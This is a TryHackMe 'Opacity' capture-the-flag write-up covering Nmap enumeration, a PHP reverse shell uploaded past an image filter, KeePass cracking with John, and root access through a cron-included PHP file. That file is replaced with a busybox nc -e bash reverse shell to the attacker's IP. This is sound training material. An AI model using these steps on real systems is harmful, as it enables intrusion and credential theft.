# THM - Opacity

#### Ip: 10.10.182.105
#### Name: Opacity
#### Difficulty: Easy

----------------------------------------------------------------------

opacity.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also use the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/Opacity]
└─$ sudo nmap -p-  --min-rate 10000 10.10.182.105
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 09:10 CDT
Nmap scan report for 10.10.182.105
Host is up (0.22s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/THM/Opacity]
└─$ sudo nmap -sC -sV 10.10.182.105 -p 22,80,139,445
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 09:11 CDT
Nmap scan report for 10.10.182.105
Host is up (0.26s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
|_  256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-08-31T14:11:37
|_  start_date: N/A
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.95 seconds
```

Taking a look at the site we find a basic login page:

![site.png

Lets try some directory fuzzing with Feroxbuster:

![ferox.png

The `/cloud` directory seems interesting. 

Navigating to the directory we find an image upload page:

![cloud.png

### Exploitation

Lets grab a copy of PentestMonkey's php-reverse-shell.php and update the IP and port fields:

php.png

This took some trial and error, but lets go ahead and save the file as shell.php, but when we upload it lets bypass the filtering by using http://10.2.6.181/shell.php#.png

Looking back at our listener and web server we can see that worked!

shell.png

Trying to grab the local.txt we get a permission denied. Looks like we'll have to keep enumerating:

```text
www-data@opacity:/home/sysadmin$ cat local.txt
cat: local.txt: Permission denied
```

Browsing around a bit more we find a KeePass file in `/opt`. Lets start a Python HTTP server on the target and grab the file on our attacking machine using wget:

wget.png

Once back on our machine we can try to access the contents, but it looks like it's password protected:

```text
┌──(ryan㉿kali)-[~/THM/Opacity]
└─$ kpcli --kdb=dataset.kdbx            
Provide the master password:
```

Lets use John to crack this:

First we'll need to get it in a format John can work with:

```text
┌──(ryan㉿kali)-[~/THM/Opacity]
└─$ keepass2john dataset.kdbx > hash.txt
```

Then we can use John to crack the password:

john.png

Cool, now we can access the KeePass file using kpcli:

kpcli.png

Cool, looks like we've now get the sysadmin user's password!

back in our shell we can issue `su sysadmin` and then grab the user.txt flag:

user_flag.png

### Privilege Escalation

Taking a look in the `/scripts` folder we see an interesting script that is owned by root:

```text
sysadmin@opacity:~/scripts$ cat script.php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

We see that it is calling the backup.inc.php file in `/lib` and that this must be being executed by a cronjob. We can't edit the script here so we'll need to delete it and create a new backup.inc.php in the `sysadmin` directory, insert a reverse shell, and then copy the file back to `/lib` to be executed by the script. 

```text
sysadmin@opacity:~$ rm scripts/lib/backup.inc.php
sysadmin@opacity:~$ vi backup.inc.php


<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
        system('/usr/bin/busybox nc 10.2.6.181 8888 -e bash');
}
?>

<snip>

sysadmin@opacity:~$ chmod +x backup.inc.php
sysadmin@opacity:~$ cp backup.inc.php /home/sysadmin/scripts/lib/
```
And then after waiting just a minute or two for the script to execute, we caught a shell back as root and were able to grab the final flag:

root_flag.png

Thanks for following along!

-Ryan